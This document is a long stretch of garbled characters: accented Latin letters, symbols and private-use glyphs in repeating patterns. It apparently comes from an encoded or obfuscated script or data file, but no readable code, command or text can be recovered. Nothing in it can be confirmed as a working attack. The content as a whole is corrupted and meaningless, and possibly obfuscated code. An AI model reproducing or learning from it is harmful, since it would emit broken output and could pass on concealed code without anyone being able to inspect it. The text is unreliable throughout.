³©öî¦éçíòùë¼ù÷òù񈭪ùòù񈭳ùòù񈷙ùòù񈷖ùòù񈷗ùòù񈷔ùòù񈰼ùòù񈰽ùòù񈰱ùòù񈷊ùòù񈷋ùòù񈭫ùòù񈭨ùòù񈱧ùòù񈸉ùòù񈬹ùòù񈹰ùòù񈹮ùòù⚡ùòù񈹧ùòù񈹤ùòù񈹥ùòù񈹢ùòù񈹠ùòù񈸜ùòù񈸝ùòù񈸚ùòù񈸛ùòù♾ﻑùòù񈹦ùòù☊ùòù񈹵ùòù񈹭ùòù񈹳ùòù񈹱ùòù񈹯ùòù񈹩ùòù񈰫ùòù񈷀ùòù⛼ﻑùòù⛽ﻑùòù⯘ﻑùòùⅉﻑùòù❿ﻑùòùⅆﻑùòù⯙ﻑùòùⅇﻑùòù⯛ﻑùòùⅈﻑùòù⅋ﻑùòù⅊ﻑùòùⅷﻑùòùⅴﻑùòù⧪ﻑùòù⧫ﻑùòù񈷝ùòù񈷚ùòù񈷇ùòù񈷄ùòù񈷅ùòù񈷂ùòù񈷃ùòù񈸎ùòù♅ﻑùòù񈶗ùòù⟿ﻑùòù⛦ﻑùòù⛱ﻑùòù⟃ﻑùòù⛸ﻑùòù⛴ﻑùòù⛰ﻑùòù񈶐ùòù񈷱ùòù⚖ùòù⚗ùòù⚔ùòù⚕ùòù⚒ùòù⚓ùòù⚐ùòù⚑ùòù⚎ùòù⚏ùòù⚌ùòù⚍ùòù☐ùòù񈷞ùòù񈷟ùòù񈷜ùòù╨ﻑùòù⌷ùòù⌳ùòù⌱ùòù┞ﻑùòù⌴ùòù⌰ùòù񈷢ùòù⌵ùòù񈷣ùòù⌲ùòù⌦ùòù⌧ùòù⌤ùòù⌑ﻑùòù񈭸ùòù񈷛ùòù񈷘ùòù񈰨ùòù񈰭ùòù񈰪ùòù⚞ﻑùòù⚜ﻑùòù♹ùòù⟈ﻑùòù❋ùòù❈ùòù❉ùòù⚠ùòù⃢ﻑùòùₗﻑùòù➍ùòù➊ùòù➋ùòù➉ùòùヮﻑùòù񈱯ùòù񈱬ùòù♋ﻑùòù⚥ﻑùòù♂ﻑùòù񈷯ùòù񈰅ùòù񈷮ùòù⮋ùòù⟛ùòù⛏ﻑùòù⟊ﻑùòù➒ùòù➐ùòù❮ùòù❡ùòùャﻑùòù⟭ﻑùòù⟪ﻑùòù➙ﻑùòùwﻑùòùpﻑùòù⇼ﻑùò³©öî¦ëíïòù±ëù÷ò³©öî¦ì¼½òù¸èù÷ò³©öî¦ê¸¸òù°ù÷ò³©öî¦çîçòù­¦êù÷ò³©öî¦ï¿ìòùîù÷ò³©öî¦æêêòù¦µù÷ò³©öî¦ê½íòùêïù÷ò³©öî¦ïíºòù³ù÷ò³©öî¦çëîòùé´ù÷ò³©öî¦ï¿½òù°ç¬ù÷ò³©öî¦èéçòù½«ù÷ò³©öî¦íêèòù¹½ù÷òù񈷁ùòù񈷾ùòù񈷿ùòù񈷼ùòù񈷽ùòù񈷺ùò³©öî¦éë¼òùé´ù÷òù񈥐ùò³©öî¦ê»ëòù÷¬û½ù÷òù񈥏ùòù񈥌ùòù񈥍ùòù⇧ﻑùòù񈥊ùòù␜ﻑùòù񈥋ùòù񈥈ùò³©öî¦çî¸òù÷¬û½ù÷òù񈥉ùò³©öî¦êî¼òùôûù÷òù񈥆ùòù񈥇ùòù񈥄ùòù񈫟ùò³©öî¦éï¼òùôûù÷ò³©öî¦ï½ëòùê©¯ù÷òù񈫨ùòù񈫱ùòù񈪎ùòù񈫧ùòù񈫄ùòù񈫬ùòù񈪏ùòù񈫦ùòù񈫪ùòù񈫭ùòù㉉ﻑùòù㉇ﻑùòù񈫤ùòù񈫫ù÷òãðððºò¦ã³©öî¦èæìòù«®³ù÷ö³©öî¦ì¸êòùù÷òóî¦íëîôî¦ïõóî¦ïôî¦¸¸çõóî¦ç¿ëôóî¦ì÷øø³©öî¦çëìòù÷¬û½ù÷ö³©öî¦æ½ìòùêïù÷òî¦ïé¸íôî¦ïõóî¦ìì¿íõî¦ëèìôî¦ì÷øø³©öî¦è¼æòùìù÷öãà³©öî¦ç¼ìòù¦±ù÷ö÷÷å·¸ö¦÷¥ª¬§¥·¸ö³©öî¦ì»æòù­¦êù÷ö³©öî¦æíæòùê©¯ù÷ò³©öî¦êí½òù²êöêù÷÷÷³©öî¦íæºòùºëèù÷ö³©öî¦èïëòù¿³½éù÷ö³©öî¦êèîòùìù÷ò³©öî¦ç½¿òù°ç¬ù÷÷÷å»²­»¥½±°­ªþã³©öî¦ìç»òù±ëù÷¢¢ù¨¨ùåøø¿©¿·ªþ³©öî¦æíºòùµ¤¼ûù÷öò¥ù­±½µùä³òù³­¹ùä¸òù´·ºùäòù­»°º»¬ùä°òù­»°º»¬«³ùä½òù¯«±ª»ºùä´òù½±³³¿°ºùä³©öî¦ìèêòùîù÷òù¿¬¹­ùäòù¼±º§ùäºòù¸¬±³¬±«®ùäòù¸¬±³»ùä¤òù·­©°»¬ùäÿÿòù·­«º±ùäÿÿòù¹¬±«®»ªª·°¹­ùä¥£òù®¬»¸·¦ùä³©öî¦ìèíòùîù÷ö¹»ª¬»¸·¦÷òù¬»®²§ùäö÷ãà¥£òù­»°º­¹ùä¼ãà³³©öî¦çëëòùì±ù÷õù»ùöò¼÷òù­·³«²¿ª»¬»­»°½»ùäö÷ãà¥£òù¬»¿½ªùä¼ãà³³©öî¦íë»òù´ºù÷õù»ùöò¥ù¬»¿½ªùä¥ùª»¦ªùä¼òùµ»§ùä¸³©öî¦èçïòù³ù÷££÷£÷å££½¿ª½¶ö¼÷¥²±¹¹»¬³©öî¦èíïòùéÿ­ù÷ö³©öî¦èêæòùìù÷ö³©öî¦æëïòù¸é¶ù÷ò¼³©öî¦èêéòùéÿ­ù÷÷÷å£½±°ª·°«»å£££·¸ö¿³©öî¦ìïïòù¿³½éù÷ö÷³©öî¦æî¼òù§ç¶ù÷öùà¦ìîù÷÷¥·¸ö³©öî¦æêìòù«®³ù÷ö³©öî¦æ½íòùêïù÷ò³©öî¦çææòù¦µù÷÷÷ãù➺ﻑùòù񈻜ùòù񈷻ùòù񈲓ùòù񈻓ùòù񈺑ùòù񈱱ùòù񈻳ùòù񈆮ùòù񈻐ùå»²­»¥½±°­ªþ¬ã³©öî¦æì¼òùôëù÷ö·­©°»¬ò°÷¢¢³©öî¦èîéòùºëèù÷ö½ò³©öî¦êëçòù®ù÷÷å·¸öÿ¬÷¥·¸ö³©öî¦ï½½òù·êù÷ö³©öî¦êêìòù¦µù÷ò³©öî¦ï¸»òùé¸ù÷÷÷¥½±°­ªþã½±°¸·¹³©öî¦ì»íòù«¹¤ù÷¢¢º»¸¿«²ª­³©öî¦ìè¼òù³ù÷å·¸ö³©öî¦èìêòù¹½ù÷öò³©öî¦ææ½òùì±ù÷÷÷ª¬§¥·¸ö³©öî¦è»èòùµýù÷ö³©öî¦æ¸ïòùÿéù÷ò³©öî¦ëêíòùºëèù÷÷÷³©öî¦ïëëòùé´ù÷ö³©öî¦èçíòùµýù÷ö³©öî¦í¿¸òùµýù÷ö³©öî¦ì½íòù²êöêù÷ö³©öî¦ç½½òùµýù÷ö³©öî¦ëç½òù´ºù÷ö³©öî¦êëèòù­¦êù÷ò©÷ò³©öî¦ç¼éòù·êù÷÷òª÷òùä¦ìîù÷ò¯³©öî¦æïíòùç®ù÷õ³©öî¦ææëòùé¸ù÷÷÷å»²­»¥½±°­ªþã¥£å³©öî¦ìë¸òù¤û»ù÷ã³©öî¦ëææòù¦±ù÷å½±°­ªþã¥£å³©öî¦½ëòùµýù÷ã¸ò¿©¿·ªþ³³©öî¦ìëëòù·êù÷õù»ùöòò÷å££½¿ª½¶ö²÷¥£½±°ª·°«»å£»²­»¥·¸ö³©öî¦æ¸ìòùµýù÷öÿªòÿ÷÷¬»ª«¬°å½±°­ªþã³©öî¦ë¼½òù¦±ù÷ö¯ò÷å·¸öøøÿ³©öî¦ì¸çòùµ³ïù÷ö¸ò÷÷¶³©öî¦æîæòùë¼ù÷öò÷å££½±°­ªþ­ã¿³©öî¦ëê»òùîù÷ö÷³©öî¦è¿½òùî³íù÷öî¦ìèìéõî¦ïîí½õóî¦íèèï÷³©öî¦æ½æòùù÷ö÷å·¸öÿ­÷½±°ª·°«»å³©öî¦ìïíòùê©¯ù÷ö»¦»½ò­ò¥ùª·³»±«ªùäî¦í¿çæòù³¿¦«¸¸»¬ùä³©öî¦éé¿òùë¼ù÷öóî¦º¸ºôóî¦ïõóî¦éè¼ôî¦ëõî¦ï¼ï¿òóî¦ìí½æõî¦ï¸¼¿õî¦íîéôî¦ì÷£ò¿­§°½öòµò÷ãà¥½±°­ªþ³ã³©ò®ã¥£å®³öî¦æèíòùù÷ã³öî¦êëîòùµ¤¼ûù÷ò®³öî¦ïîîòùé¸ù÷ã³öî¦ëë¸òùé´ù÷ò®³öî¦í»¿òùé¸ù÷ã³öî¦ææ¿òùé¸ù÷ò®³öî¦½ìòùîù÷ã³öî¦ç¿¿òùì±ù÷ò®³öî¦ïè¼òùì±ù÷ã³öî¦ëíîòù³ù÷å½±°­ªþ§ã®å·¸ö³öî¦ï»èòù­¦êù÷ö³öî¦èëæòù¿³½éù÷ò³öî¦ïîçòù¬ù÷÷÷ª¬§¥½±°­ªþ»ã³öî¦æéºòù¬ù÷ö°ò§³öî¦ïæ½òù¨§ù÷ò¤÷òã³öî¦êí»òùù÷ö»ò§³öî¦ê¼ëòùôëù÷÷å·¸öÿ½³öî¦ïé»òùé´ù÷ö÷÷¬»ª«¬°¥£å¬»ª«¬°þ¿³öî¦¸ëòùù÷ö³öî¦êëºòùì±ù÷õù°½ùöò§³öî¦çïîòùæù÷÷÷å£½¿ª½¶ö÷¥¬»ª«¬°¥£å£»²­»¥½±°­ªþ»ã³öî¦éí¸òù¿³½éù÷ö³öî¦æçíòùìù÷öµòùù÷ò³öî¦êì¸òùê©¯ù÷öòùù÷÷åª¬§¥·¸ö³öî¦æ¿¿òùæù÷ö³öî¦ëèæòù¹½ù÷ò³öî¦ìïçòù­¦êù÷÷÷ã§³öî¦æéìòùÿéù÷òã§³öî¦è»çòù°ù÷å»²­»¥·¸ö»³öî¦æéèòùµ¤¼ûù÷ö÷÷¥½±°­ªþã¥£å³öî¦èèêòù¬ù÷ã¸ò¿©¿·ªþ³³öî¦èºíòù°ù÷õù»ùöò¥ùª»¦ªùä³öî¦íéëòù°ù÷ö³öî¦èæ¸òù°ù÷ö³öî¦ç¼íòùôëù÷ò»³öî¦é½éòùî³íù÷ö÷³öî¦èíéòù°ù÷öî¦ï»ìçõî¦½ï½õóî¦ì¿êëòî¦çêôî¦ìïõóî¦èéôî¦ëçõî¦ï»èé÷÷ò³öî¦èîºòùºëèù÷÷£ò÷å£»²­»¥·¸ö÷¥·¸ö³öî¦ì¸ëòù¶ªëù÷ö³öî¦èæ¿òù«®³ù÷ò³öî¦æ¸îòùµýù÷÷÷¥³öî¦ïîëòù´ºù÷ã©³öî¦êººòùºëèù÷¢¢³öî¦çììòùîù÷å½±°­ªþãª³öî¦ï»ëòù°ù÷³öî¦ïëíòù´ºù÷öñððõúñ÷å³öî¦ë¿îòù÷¬û½ù÷ã¯³öî¦í¼æòùë¼ù÷¢¢³öî¦ë¼êòù¶ªëù÷ö³öî¦ëé¿òùé´ù÷òáóî¦íïæõî¦ìì¼¸õóî¦ï¸¿éä³öî¦ïïêòù¸èù÷÷å£»²­»¥½±°­ªþã¥£å³öî¦éæíòùµ³ïù÷ã¸ò¿©¿·ªþ³³öî¦ê¼¸òù¹½ù÷õù»ùöò¥ùª»¦ªùä³öî¦èïæòùêïù÷ö³öî¦ë»çòù§ç¶ù÷ö³öî¦íìëòù·¼ïù÷ò³öî¦ìèºòùì±ù÷³öî¦ïïìòù¦µù÷öî¦íôóî¦ëêºõî¦íêôóî¦¼îõî¦íí¿éòî¦ïçôî¦¸çõî¦ì»ôóî¦ìîõî¦ïîçºôóî¦ï÷÷òù¾ù÷£ò÷å££»²­»¥½±°­ªþ·ã¥£å·³öî¦çéïòù°ù÷ã³öî¦èêìòùù÷å½±°­ªþîã¥£åî³öî¦»¸òùµ¤¼ûù÷ã¸ò¿©¿·ªþ³³öî¦ì¸¼òùé¸ù÷õù»ùöò·òî÷å££££½¿ª½¶öï÷¥£££÷å½±°ª·°«»å££·¸ö¤÷¥·¸ö³©öî¦æ½ïòù°ù÷ö³©öî¦íìíòù¬ù÷ò³©öî¦ìïéòùµýù÷÷÷¥½±°­ªþã³©öî¦éïºòù­¤ù÷ö·­±¬»¸·¦±º»÷å·¸öÿøøÿ¿³©öî¦ê¼½òùîù÷ö³©öî¦ì¼¿òù¸èù÷ö¹»ª¬»¸·¦÷÷÷½±°ª·°«»å·¸ö÷¥·¸ö³©öî¦ëçïòù¦±ù÷ö³©öî¦ïêïòù³ù÷ò³©öî¦¼¸òù²êöêù÷÷÷¥½±°­ªþãª³©öî¦ê»¼òù®ù÷öò³©öî¦è½ëòù®ù÷ò¯÷ò®ã³©öî¦êí»òùù÷öò³©öî¦éëçòù·êù÷÷å·¸öÿ¸³©öî¦é¼ëòù±ëù÷ö®÷÷¬»ª«¬°¥£å¬»ª«¬°þ¶³©öî¦é½¿òù°ù÷ö³©öî¦æë¼òùµ³ïù÷õù°½ùö®ò³©öî¦êëëòù¿³½éù÷÷÷å£»²­»¥½±°­ªþã¿³©öî¦ë¼¸òùë¼ù÷ö÷³©öî¦èæíòùî³íù÷öñ­õñ÷î¦çèôî¦íëõóî¦èéôî¦ïéõî¦ïôóî¦ïë½ºå·¸öÿ¢¢ÿ³©öî¦èí¼òù­¤ù÷õù»ùö÷÷½±°ª·°«»å£££»²­»¥·¸ö÷³©öî¦æê½òùé¸ù÷ö¯òò¸÷å·¸ö¶÷³©öî¦æí¸òùµýù÷öòò°÷å££·¸öÿ¤øøÿ³©öî¦ïæ¿òùù÷ö·­©°»¬ò°÷øø³©öî¦ìº½òùæù÷ö½ò³©öî¦ëîìòù«¹¤ù÷÷÷¥·¸ö³©öî¦ïèëòùù÷ö³©öî¦æï¼òù¹½ù÷ò³©öî¦íìèòùìù÷÷÷³©öî¦çæºòù±ëù÷ö³©öî¦êçëòùë¼ù÷ö³©öî¦ìêèòùé¸ù÷ò³©öî¦è¿¿òùé´ù÷÷÷å»²­»¥½±°­ªþ±ã³©öî¦éìçòùºëèù÷ö½±°¸·¹³©öî¦êºïòù°ù÷ò°«²²÷á½±°¸·¹³©öî¦éç»òùîù÷ä³©öî¦í¼»òù«¹¤ù÷öº»¸¿«²ª­³©öî¦é½îòù¸èù÷ò°«²²÷áº»¸¿«²ª­³©öî¦ê¿íòùê©¯ù÷ä³©öî¦çèçòù­¦êù÷å³©öî¦íº¸òùôëù÷ö·°½±®»ò±ò÷øøö³©öî¦íçîòùé¸ù÷ö³©öî¦æïêòù·¼ïù÷ò³©öî¦íëïòù¿³½éù÷÷á³©öî¦éîºòùìù÷öòò³©öî¦ìæêòùë¼ù÷÷ä³©öî¦éï»òùù÷ö­»ª³³»º·¿ª»ò¿­§°½ö÷ãà¥½±°­ªþ³¦ã³©åª¬§¥½±°­ªþã³¦öî¦è½ïòù«®³ù÷ö½±°¸·¹³¦öî¦ï¿íòùî½ù÷õ³¦öî¦êî»òù¬ù÷ò°«²²÷á½±°¸·¹³¦öî¦æììòùîù÷õ³¦öî¦æ¸ëòù·êù÷äº»¸¿«²ª­³¦öî¦ï¿ëòù÷¬û½ù÷õ³¦öî¦ìºîòù¨§ù÷¢¢å²»ªþå·¸ö³¦öî¦èéïòù­¤ù÷÷ãå»²­»¥·¸ö³¦öî¦ï¿¿òù²êöêù÷ö³¦öî¦ëéçòùêïù÷ò³¦öî¦æ½¼òù÷¬û½ù÷÷÷ª¬§¥·¸ö³¦öî¦êºíòùºëèù÷ö³¦öî¦æëìòù«®³ù÷ò³¦öî¦ë½¸òùºëèù÷÷÷¥½±°­ªþîã®¿ª¶³¦öî¦æè»òùµýù÷öº·¬°¿³»ò³¦öî¦æ»»òùù÷ò³¦öî¦ììèòùë¼ù÷÷åã¸­³¦öî¦íê¿òùé¸ù÷öî÷á³¦öî¦íçïòùÿéù÷ö¸­³¦öî¦æ½»òù¿³½éù÷õù°½ùöîò³¦öî¦êê¼òùê©¯ù÷÷÷äù➺ﻑùòù񈻜ùòù񈷻ùòù񈲓ùòù񈻓ùòù񈺑ùòù񈱱ùòù񈻳ùòù񈆮ùòù񈻐ùå£»²­»¥·¸ö³¦öî¦éçèòù®ù÷øø¯³¦öî¦é»èòù«®³ù÷÷¬»ª«¬°þ³¦öî¦ï¿æòùç®ù÷ö³¦öî¦éïëòùµ¤¼ûù÷ö³¦öî¦æºïòùé´ù÷öùôùò³¦öî¦è¼éòùæù÷÷ò³¦öî¦è½¿òùç®ù÷÷ò¸³¦öî¦êèïòùµýù÷÷å·¸ö¶³¦öî¦éèêòù½«ù÷÷¬»ª«¬°þ³¦öî¦ïí¿òùôëù÷öùùò³¦öî¦æë»òù­¦êù÷÷å·¸ö³¦öî¦ëè¿òùôûù÷÷¬»ª«¬°þ³¦öî¦çºçòù­¤ù÷ö³¦öî¦ç»íòù§ç¶ù÷öùôùò°³¦öî¦èºîòù¶ªëù÷÷òùôù÷å¬»ª«¬°þ³¦öî¦º¿òùé´ù÷å££½¿ª½¶öì÷¥ãù➺ﻑùòù񈻜ùòù񈷻ùòù񈲓ùòù񈻓ùòù񈺑ùòù񈱱ùòù񈻳ùòù񈆮ùòù񈻐ùå£»²­»þ¬»ª«¬°þå£½±°­ªþ«ã¿ª¶³¦öî¦éìïòùæù÷ö³¦öî¦ïíëòù¶ªëù÷ö¿ª¶³¦öî¦ëæëòùé´ù÷ö÷ò³¦öî¦ïìïòù¨§ù÷÷÷òã¥£å³¦öî¦¸ºòùé´ù÷ã«ò³¦öî¦èìíòùîù÷ã¸³¦öî¦çæíòù²êöêù÷å½±°­ªþ·ã¥£å·³¦öî¦ë½¼òù¶ªëù÷ãò¿©¿·ªþ³³¦öî¦íêíòùîù÷õù»ùöò·÷å£½¿ª½¶öê÷¥££÷÷å££½±°­ªþã³©öî¦ìèïòù±ëù÷ö½±°¸·¹³©öî¦»íòù·êù÷ò°«²²÷á½±°¸·¹³©öî¦íêæòùù÷ä³©öî¦éïîòùî½ù÷öº»¸¿«²ª­³©öî¦êéºòùµýù÷ò°«²²÷áº»¸¿«²ª­³©öî¦¸¿òùôëù÷ä³©öî¦íç»òù¤û»ù÷å·¸ö³©öî¦êìíòù½«ù÷ö·°½±®»òò÷÷ª¬§¥¿©¿·ªþ³³©öî¦çèëòù«¹¤ù÷õù»­ùö¸³©öî¦èèçòùù÷÷å£½¿ª½¶ö÷¥£³©öî¦è½»òù¨§ù÷ö­¿¨»»­­¿¹»ò¸ò°ò÷³©öî¦ïêºòù¦±ù÷öö÷ãà¥£÷å·¸ö³©öî¦çê¸òù°ù÷ö·­·»©°½»ò¸÷÷³©öî¦¸îòù±ëù÷ö­¿¨»·»©°½»ò¸ò°ò÷³©öî¦éí¿òùìù÷öö÷ãà¥£÷åÿ¤øø³©öî¦ìï½òùêïù÷ö·­«º±ò°ò÷øø³©öî¦éë½òù±ëù÷ö½ò³©öî¦çêéòù±ëù÷÷øø³©öî¦æïëòùù÷ö²»¿¬°²·¿­ò°ò½òÿÿòÿ÷å·¸öøøÿ³©öî¦çìïòù§ç¶ù÷ö·­«º±ò°ò÷øøÿ¤÷¥ª¬§¥³©öî¦í¿½òù¤û»ù÷ö³©öî¦çì¸òù²êöêù÷ò³©öî¦ìîìòùµ³ïù÷÷á¿©¿·ªþ³©öî¦ìî¼òùî½ù÷ö»°¸±¬½»·°µò³ò¸òò°÷äöã³©öî¦è¼¿òùî³íù÷òã³©öî¦æí½òù¤û»ù÷÷å£½¿ª½¶ö«÷¥£ª¬§¥¿©¿·ªþ³©öî¦ïº»òù·¼ïù÷ö»°¸±¬½»ª·½µ»¬ò³ò¸òò°÷å£½¿ª½¶ö÷¥£ª¬§¥¿©¿·ªþ³©öî¦é»½òù÷¬û½ù÷ö»°¸±¬½»»º·¿ò³ò¸òò°÷å£½¿ª½¶ö·÷¥£ª¬§¥·¸ö³©öî¦¸æòùÿéù÷ö³©öî¦ç»»òùµ¤¼ûù÷ò³©öî¦íçéòù°ù÷÷÷ª¬§¥·¸ö¤÷³©öî¦í½íòùµýù÷öò½ò¿÷å·¸ö÷³©öî¦éæëòù²êöêù÷ö´òºò÷å£½¿ª½¶öï÷¥£»²­»þ¿©¿·ªþ³©öî¦ì¼ìòù¸èù÷ö»°¸±¬½»¿º©±¬ºò³ò¸òò°÷å£½¿ª½¶öï÷¥££·¸öøø³©öî¦ê¿ëòù²êöêù÷ö·­±«°ª»¬½ª·¨»ò÷÷¥½±°­ªþ¥·­±ªº³·°äì£ã³©öî¦ëìéòù·¼ïù÷ö¬»¯«·¬»ò³©öî¦ìëéòù°ù÷÷òíã¿©¿·ªþ³©öî¦éëèòùé¸ù÷öìò³ò÷³©öî¦êé¸òù²êöêù÷öö÷ãàÿ÷åÿíáö³©öî¦í»»òù¦±ù÷ö®¿«­»°º²»¿¬ò÷ò²±¹¹»¬³©öî¦ææìòùé´ù÷ö³©öî¦æéëòùôëù÷ö³©öî¦ïï½òùìù÷ö³©öî¦çëèòùù÷ò÷ò³©öî¦ïçìòù¬ù÷÷÷÷ä³©öî¦æé¿òùîù÷ö³©öî¦ììêòùêïù÷ò³©öî¦ç½ìòùé´ù÷÷á³©öî¦èêëòùù÷ö·°½¬»³»°ª±«°ªòò°÷äöã³©öî¦ê¸æòùîù÷òã³©öî¦ë¼íòù¸èù÷÷å£½±°­ªþ¼ã³©öî¦èæçòù­¤ù÷ö½±°¸·¹³©öî¦ííæòù¹½ù÷ò°«²²÷á½±°¸·¹³©öî¦ï¿êòù·¼ïù÷äº»¸¿«²ª­³©öî¦ïæèòù­¤ù÷å·¸ö¼÷¥·¸ö³©öî¦»ìòù·¼ïù÷ö³©öî¦éºêòùù÷ò³©öî¦íí½òù«®³ù÷÷÷¥½±°­ªþèã³©öî¦èî¼òùé¸ù÷³©öî¦êìºòù¿³½éù÷öù¢ù÷å²»ªþéãî¦èíéõóî¦ììôóî¦çïõóî¦ïôî¦ïçéçå©¶·²»öÿÿ÷¥­©·ª½¶öèéõõ÷¥½¿­»ùîùä·¸ö³©öî¦èæ»òù°ù÷öò¸÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùïùä·¸öÿ¯÷¬»ª«¬°ÿå½±°ª·°«»å½¿­»ùìùä¬»ª«¬°ÿå½¿­»ùíùä·¸ö³©öî¦ëçºòù¹½ù÷ö°òÿ÷øø³©öî¦æçîòùæù÷ö¤ò÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùêùä·¸ö³©öî¦èêêòù¸èù÷ö¶òÿÿ÷øø³©öî¦çèêòùéÿ­ù÷öò÷÷¬»ª«¬°ÿÿå½±°ª·°«»å£¼¬»¿µå££»²­»¥½±°­ªþèã³©öî¦ëæîòùîù÷ö·­±¬»¸·¦±º»÷òéãèá³©öî¦ìê»òùôëù÷ö±±²»¿°òö¿³©öî¦é¼½òùîù÷ö÷³©öî¦æè¿òùôëù÷öñ­õñ÷î¦ïïæ½õóî¦ë½íôóî¦ïõî¦ïë¸ôóî¦ïï¢¢ùù÷³©öî¦çêìòùç®ù÷õù»ùö÷÷ä¿³©öî¦ç»¸òù½«ù÷ö³©öî¦íï½òùôëù÷ö¹»ª¬»¸·¦÷÷å·¸öÿé÷¥·¸ö³©öî¦è½¸òù«®³ù÷ö³©öî¦ç¼æòù®ù÷ò³©öî¦íç½òùé´ù÷÷÷¥½±°­ªþçã¥£å¬»ª«¬°þç³©öî¦ïçæòù²êöêù÷ãç³©öî¦ééæòùç®ù÷õù±ù³©öî¦íî½òù´ºù÷õ³©öî¦íè»òùµ¤¼ûù÷òç³©öî¦ïìíòù°ù÷ã³©öî¦èìèòù­¦êù÷õù±ù³©öî¦í½éòùë¼ù÷õùªù¢¢©³©öî¦è¼¸òù®ù÷õù±ù³©öî¦èîîòùêïù÷òç³©öî¦ëç»òùµýù÷ãª³©öî¦ê¸¼òùé¸ù÷õù±ù³©öî¦ìíºòùîù÷òçå£»²­»þª¬§¥·¸ö³©öî¦ê¿½òùºëèù÷ö³©öî¦éæ¼òùî½ù÷ò³©öî¦ï¼çòù°ù÷÷÷¥½±°­ªþçã³©öî¦æ¼ïòùç®ù÷ö¸­³©öî¦éè¿òùÿéù÷õù°½ùö®¿ª¶³©öî¦æï»òù­¤ù÷öº·¬°¿³»ò³©öî¦êëæòù³ù÷ò³©öî¦çººòùì±ù÷÷ò³©öî¦éæºòù¸èù÷÷÷òã¿³©öî¦èíºòù¬ù÷õù»ùö÷³©öî¦ì¸îòùù÷ö÷òãçå·¸ö÷¥·¸ö³©öî¦çèæòùîù÷ö³©öî¦êîëòù¦±ù÷ò³©öî¦ììºòù®ù÷÷÷ã³©öî¦çíêòù³ù÷òã³©öî¦èëéòùìù÷å»²­»¥½±°­ªþã¥£å³©öî¦æï¿òù¹½ù÷ãò¿©¿·ªþ³©öî¦ï¼æòùôëù÷ö­»°º»®²§ò³òòò¸÷å½±°ª·°«»å£££»²­»¥½±°­ªþã¥£å¬»ª«¬°þ³©öî¦ìæïòùµ³ïù÷ã³©öî¦¼ëòù°ù÷õù±ù³©öî¦ç¼»òù¶ªëù÷õ³©öî¦ïçéòùµýù÷ò³©öî¦êç½òù²êöêù÷ã³©öî¦ìêíòù¹½ù÷õù±ù³©öî¦íïíòù½«ù÷õùªù¢¢©³©öî¦èìèòù­¦êù÷õù±ù³©öî¦éîéòù­¦êù÷ò³©öî¦ìê¿òù·¼ïù÷ãª³©öî¦ºïòù´ºù÷õù±ù³©öî¦ææ¼òù°ç¬ù÷òå££½¿ª½¶ö÷¥££££½±°­ªþã³©öî¦êïîòù­¤ù÷ö¹»ª¬»¸·¦÷ò¬ã³©öî¦íºîòù­¤ù÷ö·­±¬»¸·¦±º»÷å·¸öÿ¬øøÿ¿³©öî¦ê¸ïòùù÷ö÷÷½±°ª·°«»å½±°­ªþ­ã¬á¿³©öî¦ïíèòù¨§ù÷ö÷³©öî¦êéêòùæù÷öñ­õñ÷ä¿³©öî¦ïºéòùµ¤¼ûù÷ö³©öî¦çíìòùµ³ïù÷÷³©öî¦çëïòù²êöêù÷ö÷³©öî¦è»ìòùµýù÷öñ­õñ÷òã­³©öî¦ìíæòù¹½ù÷ö÷ò¨ãö³©öî¦éìºòùôëù÷ö÷¢¢ùù÷³©öî¦è»¸òù¹½ù÷õù»ùö÷å·¸öÿ¨÷½±°ª·°«»å·¸öÿ³©öî¦ïìçòùî³íù÷ö·­©°»¬ò°÷øø³©öî¦è½îòùç®ù÷ö½ò³©öî¦ì¼¸òù¹½ù÷÷÷¥½±°­ªþã³©öî¦çïíòùºëèù÷ö³©öî¦ïêíòù¹½ù÷ö½òùäù÷ò¨÷òã½±±²º±©°­³©öî¦çéìòùé¸ù÷ö÷¢¢óî¦ïçì½õî¦ïºæ»õóî¦êèìò©ã¿ª»³©öî¦ê¼éòùµ³ïù÷ö÷å·¸ö³©öî¦ï»ìòùìù÷ö³©öî¦çííòù¬ù÷ö©ò÷ò÷÷¥·¸ö³©öî¦èèºòù¤û»ù÷ö³©öî¦ï¿çòùéÿ­ù÷ò³©öî¦èë¿òù¬ù÷÷÷¥½±°­ªþãå·¸öøø³©öî¦éè¼òùì±ù÷õù±ùøø³©öî¦ì¸ìòùî½ù÷õù±ù³©öî¦ºîòùµ¤¼ûù÷õ³©öî¦êç¿òùê©¯ù÷÷¥½±°­ªþ¯ã¥£å¬»ª«¬°þ¯³©öî¦æ½½òù«¹¤ù÷ã³©öî¦í¼êòùù÷õù±ù³©öî¦íî½òù´ºù÷õ³©öî¦êè½òù¦µù÷ò¯³©öî¦èê½òùì±ù÷ã³©öî¦éèèòùë¼ù÷õù±ù³©öî¦ì¿ºòù«¹¤ù÷õùªù¢¢©³©öî¦º»òù¸é¶ù÷õù±ù³©öî¦éìîòùÿéù÷ò¯³©öî¦ë½ìòùéÿ­ù÷ã³©öî¦ææïòùêïù÷õù±ù³©öî¦ïíîòù¨§ù÷ò¯å££»²­»¥½±°­ªþã³©öî¦ê»ïòùµ³ïù÷ö³©öî¦ì¿èòù®ù÷öò³©öî¦ï¼½òù¦µù÷ö©ò÷÷òî¦éê¼ôóî¦êõî¦ïôóî¦êç¸õî¦ìë¼íôî¦ï÷³©öî¦ïèïòùê©¯ù÷öî¦ìï¼ºõóî¦ïéìêõóî¦¿çæ÷åª¬§¥·¸ö³©öî¦èììòùµýù÷ö³©öî¦ëîîòùç®ù÷ò³©öî¦éïíòù°ù÷÷÷¥½±°­ªþ¯ã¥£å¯³©öî¦æîëòùë¼ù÷ã¸ò¿©¿·ªþ³³©öî¦è½ìòùÿéù÷õù»ùöò¥ùª»¦ªùä³©öî¦èíëòù³ù÷ö³©öî¦è¼çòùù÷ö³©öî¦éì»òù°ù÷ò÷ò³©öî¦ë»¸òùµ¤¼ûù÷÷£ò¯÷å£»²­»þã³©öî¦æ¼èòù­¤ù÷òã³©öî¦íèæòù¹½ù÷áð³©öî¦êèëòùé¸ù÷õ³©öî¦çæ¿òù¹½ù÷áð³©öî¦è½éòùôëù÷¢¢³©öî¦æçèòù®ù÷å£½¿ª½¶ö¸÷¥£½±°ª·°«»å££½±±²º±©°­³©öî¦ëíçòùôûù÷öò©÷å£½±°­ªþãá